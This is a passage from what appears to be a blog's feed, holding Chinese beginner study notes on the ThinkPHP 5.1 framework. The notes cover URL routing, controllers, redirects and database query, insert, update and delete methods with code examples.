表示新增和修改均要自动完成，而不给默认值的字段需要修改器提供； </span><br></pre></td></tr></table></figure><p>修改时，如果你不去修改邮箱，在数据自动完成强制完成，会自动完成大写； 8. 也就是说，邮箱的大写，设置 update 更加合适，因为新增必填必然触发修改器； 9. 对于 update 自动完成，和 auto、insert 雷同，自行演示；</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ThinkPhP学习第二天&quot;&gt;&lt;a href=&quot;#ThinkPhP学习第二天&quot; class=&quot;headerlink&quot; title=&quot;ThinkPhP学习第二天&quot;&gt;&lt;/a&gt;ThinkPhP学习第二天&lt;/h1&gt;&lt;h2 id=&quot;聚合、原生、子查询&quot;&gt;&lt;a href=&quot;#聚合、原生、子查询&quot; class=&quot;headerlink&quot; title=&quot;聚合、原生、子查询&quot;&gt;&lt;/a&gt;聚合、原生、子查询&lt;/h2&gt;&lt;h3 id=&quot;一、聚合查询&quot;&gt;&lt;a href=&quot;#一、聚合查询&quot; class=&quot;headerlink&quot; title=&quot;一、聚合查询&quot;&gt;&lt;/a&gt;一、聚合查询&lt;/h3&gt;&lt;p&gt;查询数量&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$result &amp;#x3D; Db::name(&amp;#39;user&amp;#39;)-&amp;gt;count(&amp;#39;uid&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;uid如果不加，就是全查询&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;最大/小值&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$result &amp;#x3D; Db::name(&amp;#39;user&amp;#39;)-&amp;gt;max&amp;#x2F;min(&amp;#39;price&amp;#39;，可选参数);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;取值为bool，可以判断整型还是浮点型&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;平均值和总和同SQL&lt;/p&gt;</summary>
    
    
    
    <category term="编程" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="编程" scheme="http://example.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPhP学习第一天</title>
    <link href="http://example.com/2020/09/17/URL%E8%A7%A3%E6%9E%90%E6%A8%A1%E5%BC%8F/"/>
    <id>http://example.com/2020/09/17/URL%E8%A7%A3%E6%9E%90%E6%A8%A1%E5%BC%8F/</id>
    <published>2020-09-17T11:50:05.000Z</published>
    <updated>2020-09-17T16:27:04.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPhP学习-第一天"><a href="#ThinkPhP学习-第一天" class="headerlink" title="ThinkPhP学习-第一天"></a>ThinkPhP学习-第一天</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>.htaceess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$<span class="number">1</span>]</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><p>要改成这样，并且打开伪静态模块</p><a id="more"></a><h2 id="学习开始"><a href="#学习开始" class="headerlink" title="学习开始"></a>学习开始</h2><h2 id="URL解析模式"><a href="#URL解析模式" class="headerlink" title="URL解析模式"></a>URL解析模式</h2><p><code>http://serverName/index.php/模块/控制器/操作/参数/值…</code></p><p>首先这就是一个正常的URL模式的解析示例</p><p>index.php =&gt; 入口文件</p><p>模块 =&gt; application 目录下的一个可自定义的目录(默认index)</p><p>控制器=&gt;在 index 目录下有一个 controller 控制器目录的 Index.php 控制器(<strong>Index.php 控制器的类名也必须是 class Index)</strong></p><p>操作 =》 就是类的一个方法</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">test</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Abc</span> </span>&#123; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params">$who = <span class="string">&#x27;隔壁老王&#x27;</span></span>) </span>&#123; <span class="keyword">return</span> $who.<span class="string">&#x27;吃饭！&#x27;</span>; &#125; &#125;</span><br></pre></td></tr></table></figure><p>将以上代码复制到application目录下的test目录下的controller目录下的Abc.php（控制器）</p><p>则 url就是 ：<code>public/index.php/test/abc/eat/who/主人老李</code></p><h2 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h2><h3 id="一-目录架构"><a href="#一-目录架构" class="headerlink" title="一.目录架构"></a>一.目录架构</h3><p>1.thinkphp多模块，单模块均支持，通过<code>app_multi_module</code>这个参数来调节</p><p>2.手册上的目录架构</p><p><img src="https://i.loli.net/2020/09/17/78251DvgTrGRwdn.png"></p><p>3.命令空间统一：app\模块名  eg：：<code>app\index\controller\Index</code> </p><p>4.多模块访问必须指定模块，单模块则不用</p><p>5.绑定了模块，然后绑定了控制器</p><p><code>    Container::get(&#39;app&#39;)-&gt;bind(&#39;test/abc&#39;)-&gt;run()-&gt;send();</code></p><h3 id="二、空模块"><a href="#二、空模块" class="headerlink" title="二、空模块"></a>二、空模块</h3><p><code>&#39;empty_module&#39;</code></p><p> 可以通过环境变量设置空目录，将不存在的目录统一指向指定目录； </p><h3 id="三、单一模块"><a href="#三、单一模块" class="headerlink" title="三、单一模块"></a>三、单一模块</h3><p>命名空间改为<code>app/controller</code></p><p>目录架构改为:</p><p><img src="https://i.loli.net/2020/09/17/7TpNWY64n3eIMZE.png"></p><h3 id="四、环境变量"><a href="#四、环境变量" class="headerlink" title="四、环境变量"></a>四、环境变量</h3><p>ThinkPHP5.1 提供了一个类库 Env 来获取环境变量； <code>return Env::get(&#39;app_path&#39;);</code></p><p><img src="https://i.loli.net/2020/09/17/Nr3xbTnHoFpOfdk.png"></p><h2 id="控制器定义"><a href="#控制器定义" class="headerlink" title="控制器定义"></a>控制器定义</h2><h3 id="一．控制器定义"><a href="#一．控制器定义" class="headerlink" title="一．控制器定义"></a>一．控制器定义</h3><ol><li>控制器，即 controller，控制器文件存放在 controller 目录下；</li><li>类名和文件名大小写保持一致，并采用驼峰式（首字母大写）； use think\Controller; class Index extends Controller</li><li>继承控制器基类，可以更方便使用功能，但不是必须的；</li><li>系统也提供了其它方式，在不继承的情况下完成相同功能； </li><li>前面我们知道如果是一个单词，首字母大写，比如 class Index；</li><li>URL 访问时直接 public/index 即可； </li><li>那么如果创建的是双字母组合，比如 class HelloWorld； </li><li>URL 访问时必须为：public/hello_world； </li><li>如果你想原样的方式访问 URL，则需要关闭配置文件中自动转换； ‘url_convert’ =&gt; false,</li><li>此时，URL 访问可以为：public/HelloWorld； </li><li>如果你想改变根命名空间 app 为其它，可以在根目录下创建.env 文件； </li><li>后写上配对的键值对即可，app_namespace=application</li></ol><h3 id="二、渲染输出"><a href="#二、渲染输出" class="headerlink" title="二、渲染输出"></a>二、渲染输出</h3><p>ThinkPHP 直接采用方法内 return 返回的方式直接就输出了； </p><p> 使用 json 输出，直接采用 json 函数； </p><p><code>$data = array(&#39;a&#39;=&gt;1, &#39;b&#39;=&gt;2, &#39;c&#39;=&gt;3); return json($data);</code></p><p>使用 view 输出模版，开启错误提示，可知道如何创建模版； </p><p>return view();</p><p>默认输出方式为 html 格式输出，如果返回的是数组，则会报错；</p><p> 可以更改配置文件里的默认输出类型，更改为 json； return [‘user’=&gt;’Lee’, ‘age’=&gt;100]; ‘default_return_type’ =&gt; ‘json’,</p><p>一般来说，正常页面都是 html 输出，用于模版，AJAX 默认为 json； </p><p>如果继承了基类控制器，那么可以定义控制器初始化方法：initialize()； </p><p>initialize()方法会在调用控制器方法之前执行； protected function initialize() { //parent::initialize(); echo ‘init’; }</p><p>initialize()方法不需要任何返回值，输出用 PHP 方式，return 无效；</p><h2 id="控制器的编写"><a href="#控制器的编写" class="headerlink" title="控制器的编写"></a>控制器的编写</h2><h3 id="一、前置操作"><a href="#一、前置操作" class="headerlink" title="一、前置操作"></a>一、前置操作</h3><ol><li><p>继承 Controller 类后可以设置一个$beforeActionList 属性来创建前置方法；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $beforeActionList=[</span><br><span class="line">        <span class="string">&#x27;first&#x27;</span>,</span><br><span class="line">        <span class="comment">//one 方法不执行</span></span><br><span class="line">        <span class="string">&#x27;second&#x27;</span> =&gt; [<span class="string">&#x27;except&#x27;</span>=&gt;<span class="string">&#x27;one&#x27;</span>],</span><br><span class="line">        <span class="comment">//指定调用</span></span><br><span class="line">        <span class="string">&#x27;third&#x27;</span> =&gt; [<span class="string">&#x27;only&#x27;</span>=&gt;<span class="string">&#x27;one&#x27;</span>],</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><p><strong>要继承</strong></p></li><li><p>此时，我们可以分别 URL 访问不同的方法来理解前置的触发执行；</p></li></ol><h3 id="二、跳转和重定向"><a href="#二、跳转和重定向" class="headerlink" title="二、跳转和重定向"></a>二、跳转和重定向</h3><p>1.Controller 提供两个跳转方法 success(msg,url) 和error(msg);</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;flag)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;不指定，就返回refer</span><br><span class="line">            $this-&gt;success(&#39;注册成功&#39;,&#39;..&#x2F;&#39;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&quot;失败&quot;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>2.成功或错误有一个固定的页面模版：’thinkphp/tpl/dispatch_jump.tpl’； </p><p>3.在 app.php 配置文件中，我们可以更改自己个性化的跳转页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;dispatch_success_tmpl&#39; &#x3D;&gt; Env::get(&#39;think_path&#39;) </span><br><span class="line">&#39;tpl&#x2F;dispatch_jump.tpl&#39;, &#39;dispatch_error_tmpl&#39; &#x3D;&gt; Env::get(&#39;think_path&#39;) . &#39;tpl&#x2F;dispatch_jump.tpl&#39;,</span><br></pre></td></tr></table></figure><p>4.环境变量</p><p><img src="https://i.loli.net/2020/09/17/7QtCDzHNShp3MfU.png"></p><h3 id="二、空方法和空控制器"><a href="#二、空方法和空控制器" class="headerlink" title="二、空方法和空控制器"></a>二、空方法和空控制器</h3><p>1.不存在的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;空方法拦截</span><br><span class="line">    public function _empty($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>2.不存在控制器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Error</span><br><span class="line">&#123;</span><br><span class="line">    public function index(Request $request)</span><br><span class="line">    &#123;</span><br><span class="line">        return &#39;此控制器不存在&#39;.$request-&gt;controller();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.默认空控制器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 默认的空控制器名</span><br><span class="line">    &#39;empty_controller&#39;       &#x3D;&gt; &#39;Error&#39;,</span><br></pre></td></tr></table></figure><h2 id="数据库与模型"><a href="#数据库与模型" class="headerlink" title="数据库与模型"></a>数据库与模型</h2><h3 id="一、连接数据库（PDO模式）"><a href="#一、连接数据库（PDO模式）" class="headerlink" title="一、连接数据库（PDO模式）"></a>一、连接数据库（PDO模式）</h3><p><code>config</code>下的<code>database.php</code>可以配置链接数据</p><p>具体配置属性到配置文件查看</p><p>###　二、开始使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public  function getNoModelData()</span><br><span class="line">    &#123;</span><br><span class="line">       &#x2F;&#x2F;$data &#x3D; Db::table(&#39;tp_user&#39;)-&gt;select();</span><br><span class="line">        $data &#x3D; Db::name(&#39;user&#39;)-&gt;select();</span><br><span class="line">        return json($data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>注意区别</strong></p><h3 id="三、模型定义"><a href="#三、模型定义" class="headerlink" title="三、模型定义"></a>三、模型定义</h3><p>模型：处理数据库相关模型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\model;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class User extends Model</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用trace 查看原生的SQL；</p><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Db::table(&#39;tp_user&#39;)-&gt;find();&#x2F;&#x2F;查询出一条数据</span><br><span class="line">Db::getLastSql();&#x2F;&#x2F;查询上一次使用的查询语句是什么</span><br><span class="line">$data &#x3D; Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;,27)-&gt;find(); 指定查询，链式</span><br><span class="line">无返回值，就是null</span><br><span class="line"> $data &#x3D; Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;,127)-&gt;findOrFail(); 查找不到就抛出异常</span><br><span class="line"> Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;,127)-&gt;findOrEmpty(); 查询不到就返回空数组</span><br><span class="line"> $data &#x3D; Db::table(&#39;tp_user&#39;)-&gt;select(); 查询多列数据</span><br><span class="line"> $data &#x3D; Db::table(&#39;tp_user&#39;)-&gt;where(&#39;id&#39;,27)-&gt;selectOrFail();</span><br><span class="line"> Db::name()不需要前缀</span><br></pre></td></tr></table></figure><p>助手函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\db助手函数</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;value(&#39;username&#39;);指定字段的值</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;column(&#39;username&#39;,&#39;id&#39;);一列的值，并且用id作为索引，返回一个array</span><br></pre></td></tr></table></figure><p>数据分批处理和大数据处理和json数据处理，具体问题具体分析</p><h2 id="链式查询"><a href="#链式查询" class="headerlink" title="链式查询"></a>链式查询</h2><h3 id="一-查询规则"><a href="#一-查询规则" class="headerlink" title="一.查询规则"></a>一.查询规则</h3><p>1.<code>-&gt;</code>多次调用</p><p>2<code>.find(),select()</code>结束查询</p><p>3.有多少种链式查询规则呢？</p><h3 id="二、多次查询"><a href="#二、多次查询" class="headerlink" title="二、多次查询"></a>二、多次查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$user &#x3D; Db::name(&#39;user&#39;);</span><br><span class="line">        $data1 &#x3D; $user-&gt;where(&#39;id&#39;,27)-&gt;select();</span><br><span class="line">        $data2 &#x3D; $user-&gt;removeOption(&#39;where&#39;)-&gt;select();</span><br><span class="line">        return json($data2);</span><br></pre></td></tr></table></figure><h2 id="增删改操作"><a href="#增删改操作" class="headerlink" title="增删改操作"></a>增删改操作</h2><h3 id="一-新增数据"><a href="#一-新增数据" class="headerlink" title="一.新增数据"></a>一.新增数据</h3><p><code>insert()</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data = [ &#x27;username&#x27; =&gt; &#x27;辉夜&#x27;, &#x27;password&#x27; =&gt; &#x27;123&#x27;, &#x27;gender&#x27; =&gt; &#x27;女&#x27;, &#x27;email&#x27; =&gt; &#x27;huiye@163.com&#x27;, &#x27;price&#x27; =&gt; 90, &#x27;details&#x27; =&gt; &#x27;123&#x27;, &#x27;create_time&#x27; =&gt; date(&#x27;Y-m-d H:i:s&#x27;) ]</span><br><span class="line">Db::name(&#x27;user&#x27;)-&gt;insert($data);</span><br><span class="line">Db::name(&#x27;user&#x27;)-&gt;data($data)-&gt;insert();</span><br></pre></td></tr></table></figure><p>会返回一个影响行数</p><p><strong>mysql支持replace写入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;insert($data,true);唯一确定标识的时候，就会把原来的参数删除掉，然后新建</span><br></pre></td></tr></table></figure><p>批量写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;insertAll($dataAll);二维数组，其余相同</span><br></pre></td></tr></table></figure><h3 id="二-修改数据"><a href="#二-修改数据" class="headerlink" title="二.修改数据"></a>二.修改数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [</span><br><span class="line">            &#39;username&#39; &#x3D;&gt; &#39;李白&#39;,</span><br><span class="line">        ];</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;,239)-&gt;update($data);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, 38)-&gt; data($data)-&gt;update([&#39;password&#39;&#x3D;&gt;&#39;456&#39;]);</span><br></pre></td></tr></table></figure><p>如果有唯一性主键</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [ &#39;username&#39; &#x3D;&gt; &#39;李白&#39;, &#39;id&#39; &#x3D;&gt; 38 ]; Db::name(&#39;user&#39;)-&gt;update($data);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;inc(&#39;price&#39;)-&gt;update($data); #自增加1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;exp(&#39;email&#39;,&#39;UPPER(email)&#39;)-&gt;update($data);让data中指定的数据的email字段变成大写</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data &#x3D; [ &#39;username&#39; &#x3D;&gt; &#39;李白&#39;, &#39;email&#39; &#x3D;&gt; Db::raw(&#39;UPPER(email)&#39;), &#39;price&#39; &#x3D;&gt; Db::raw(&#39;price - 3&#39;), &#39;id&#39; &#x3D;&gt; 38 ];</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;update($data);</span><br><span class="line">raw方法更新</span><br></pre></td></tr></table></figure><p>如果只想改其中的一个值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, 38)-&gt;setField(&#39;username&#39;, &#39;辉夜&#39;);</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;, 38)-&gt;setInc(&#39;price&#39;); setDec()减值，后面可加步长</span><br></pre></td></tr></table></figure><h3 id="三-删除数据"><a href="#三-删除数据" class="headerlink" title="三.删除数据"></a>三.删除数据</h3><ol><li>极简删除可以根据主键直接删除，删除成功返回影响行数，否则 0； Db::name(‘user’)-&gt;delete(51);</li><li>根据主键，还可以删除多条记录； Db::name(‘user’)-&gt;delete([48,49,50]);</li><li>正常情况下，通过 where()方法来删除； Db::name(‘user’)-&gt;where(‘id’, 47)-&gt;delete();</li><li>通过 true 参数删除数据表所有数据，我还没测试，大家自行测试下； Db::name(‘user’)-&gt;delete(true);</li></ol><h2 id="查询表达式"><a href="#查询表达式" class="headerlink" title="查询表达式"></a>查询表达式</h2><h3 id="一、比较查询"><a href="#一、比较查询" class="headerlink" title="一、比较查询"></a>一、比较查询</h3><p> where(字段名,查询条件)，where(字段名,表达式,查询条件)； </p><p> 其中，表达式不区分大小写，包括了比较、区间和时间三种类型的查询</p><p>使用&lt;&gt;、&gt;、&lt;、&gt;=、&lt;=可以筛选出各种符合比较值的数据列表； </p><h3 id="二、区间查询"><a href="#二、区间查询" class="headerlink" title="二、区间查询"></a>二、区间查询</h3><p>1.使用like表达式去查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;email&#39;,&#39;like&#39;,&#39;xiao%&#39;)-&gt;select();</span><br><span class="line">数组传递，模糊查询</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;email&#39;,&#39;like&#39;,[&#39;xiao%&#39;,&#39;wu%&#39;],&#39;or&#39;)-&gt;select();注意or</span><br></pre></td></tr></table></figure><p>2.模版查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;whereLike(&#39;email&#39;,&#39;xiao%&#39;)-&gt;select();</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereNotLike(&#39;email&#39;,&#39;xiao%&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><p>3.between表达式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;,&#39;between&#39;,&#39;19,25&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;,&#39;between&#39;,[19, 25])-&gt;select();</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereBetween(&#39;id&#39;,[19, 25])-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereNotBetween(&#39;id&#39;,[19, 25])-&gt;select();</span><br></pre></td></tr></table></figure><p>4.in</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;,&#39;in&#39;, &#39;19,21,29&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereIn(&#39;id&#39;,&#39;19,21,29&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereNotIn(&#39;id&#39;,&#39;19,21,29&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><p>5.null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;uid&#39;,&#39;null&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;uid&#39;,&#39;not null&#39;)-&gt;select();</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereNull(&#39;uid&#39;)-&gt;select(); </span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereNotNull(&#39;uid&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><h3 id="三、自定义"><a href="#三、自定义" class="headerlink" title="三、自定义"></a>三、自定义</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;id&#39;,&#39;exp&#39;,&#39;IN (19,21,25)&#39;)-&gt;select();</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereExp(&#39;id&#39;,&#39;IN (19,21,25)&#39;)-&gt;select();</span><br></pre></td></tr></table></figure><h2 id="时间查询"><a href="#时间查询" class="headerlink" title="时间查询"></a>时间查询</h2><h3 id="一、传统方式"><a href="#一、传统方式" class="headerlink" title="一、传统方式"></a>一、传统方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有time才会自动填充时间</span><br><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;where(&#39;create_time&#39;,&#39;&gt; time&#39;,&#39;2018-1-1&#39;)-&gt;select();</span><br><span class="line">between查询</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;where(&#39;create_time&#39;,&#39;between time&#39;,[&#39;2018-1-1&#39;,&#39;2019-12-1&#39;])-&gt;select();</span><br></pre></td></tr></table></figure><h3 id="二、快捷方式"><a href="#二、快捷方式" class="headerlink" title="二、快捷方式"></a>二、快捷方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wheretime()</span><br><span class="line">$result &#x3D; Db::name(&#39;user&#39;)-&gt;whereTime(&#39;create_time&#39;,&#39;between&#39;,[&#39;2018-1-1&#39;,&#39;2019-12-1&#39;])-&gt;select();</span><br><span class="line">默认是大于符号</span><br><span class="line">whereBetweenTime()</span><br><span class="line">Db::name(&#39;user&#39;)-&gt;whereBetweenTime(&#39;create_time&#39;,&#39;2018-1-1&#39;,&#39;2019-12-1&#39;)-&gt;select()如果只有一个参数就是当时的一天</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="三、固定查询"><a href="#三、固定查询" class="headerlink" title="三、固定查询"></a>三、固定查询</h3><table><thead><tr><th align="center">last week</th><th>上周</th></tr></thead><tbody><tr><td align="center">month 或者 m</td><td>本月</td></tr><tr><td align="center">last month</td><td>上月</td></tr><tr><td align="center">year 或 y</td><td>今年</td></tr><tr><td align="center">last year</td><td>去年</td></tr><tr><td align="center">today</td><td>今天</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result &#x3D; 